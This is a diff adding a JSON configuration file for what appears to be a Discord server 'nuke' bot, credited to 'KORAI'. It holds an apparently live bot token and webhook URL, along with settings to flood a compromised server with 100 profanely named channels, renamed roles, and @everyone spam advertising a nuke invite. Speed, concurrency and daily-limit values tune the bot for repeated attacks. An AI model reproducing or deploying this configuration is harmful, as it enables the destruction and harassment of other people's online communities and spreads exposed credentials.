@@ -1,0 +1,46 @@
+{
+    "token": "MTU1NDE1NzQ2OTk4MTIyMDkyNA.GZeVNZ.yS62XTDwmXqFDPtomXfNEg_-K-yQxHU6gsFoQc",
+    "prefix": "$",
+    "owner_ids": [
+        1401255591749488781
+    ],
+
+    "log_webhook": {
+    "enabled": true,
+    "url": "https://discord.com/api/webhooks/1556757945843449916/7MYKbMya0QMImO5xcnZeKFwHgQcZ-AulKe_ZXudq6L9250SiVim8BPVb1gdq7iRIzspF"
+    },
+    
+    "nuke": {
+        "channel_count": 100,
+        "channel_names": [
+            "「💣」f̷u̷c̷k̷e̷d̷-̷b̷y̷-̷k̷o̷r̷a̷i̷",
+            "「🔨」d̷e̷v̷a̷s̷t̷a̷t̷e̷d̷-̷b̷y̷-̷k̷o̷r̷a̷",
+            "「🌪️」t̷o̷r̷n̷-̷a̷p̷a̷r̷t̷-̷b̷y̷-̷k̷o̷r̷a̷i̷",
+            "「🩸」R̷u̷i̷n̷e̷d̷-̷b̷y̷-̷k̷o̷r̷a̷i̷",
+            "「🧨」b̷l̷a̷s̷t̷-̷b̷y̷-̷k̷o̷r̷a̷i̷",
+            "「💣」b̷l̷a̷s̷t̷-̷b̷y̷-̷k̷o̷r̷a̷i̷",
+            "「💥」d̷e̷s̷t̷r̷o̷y̷e̷d̷-̷b̷y̷-̷k̷o̷r̷a̷i̷",
+            "「🔥」c̷o̷n̷q̷u̷e̷r̷e̷d̷-̷b̷y̷-̷k̷o̷r̷a̷i̷",
+            "「💀」d̷e̷a̷d̷-̷b̷y̷-̷k̷o̷r̷a̷i̷",
+            "「☠️」e̷r̷a̷d̷i̷c̷a̷t̷e̷d̷-̷b̷y̷-̷k̷o̷r̷a̷i̷"
+        ],
+        "role_count": 10,
+        "role_names": ["「💣」f̷u̷c̷k̷e̷d̷-̷b̷y̷-̷k̷o̷r̷a̷i̷"],
+        "message_count": 70,
+        "webhook_name": "NUKED",
+        "webhook_message": "||@everyone @here|| **SERVER NUKED BY KORAI. THIS IS WAR FUCK OFF. JOIN FOR NUKES: discord.gg/9WaZdcFRAH** https://www.youtube.com/watch?v=c0CrFMcuKPM",
+        "server_name": "「💣」f̷u̷c̷k̷e̷d̷-̷b̷y̷-̷k̷o̷r̷a̷i̷",
+        "server_description": "Server Compromised by KORAI",
+        "batch_size": 5,
+        "delay": 0.01
+    },
+    
+    "advanced": {
+        "concurrent_requests": 10,
+        "max_retries": 3,
+        "daily_nuke_limit": 500,
+        "cooldown_between_nukes": 120,
+        "auto_rotate_tokens": false
+    }
+}
+
